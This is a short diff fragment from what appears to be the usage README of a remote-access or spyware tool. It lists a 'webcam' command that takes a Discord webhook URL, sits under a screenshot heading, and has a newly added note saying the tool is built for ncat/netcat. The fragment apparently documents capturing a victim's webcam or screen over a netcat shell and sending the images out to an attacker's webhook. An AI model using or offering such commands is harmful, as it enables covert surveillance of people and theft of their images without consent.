@@ -14,3 +14,6 @@ For Screenshot:
 
 For Webcam:
 [*] >> webcam https://discord.com/api/webhooks/your_webhook_url_that_u_copied
+
+
+NOTE:- THIS IS ESPECIALLY MADE FOR NCAT/NETCAT
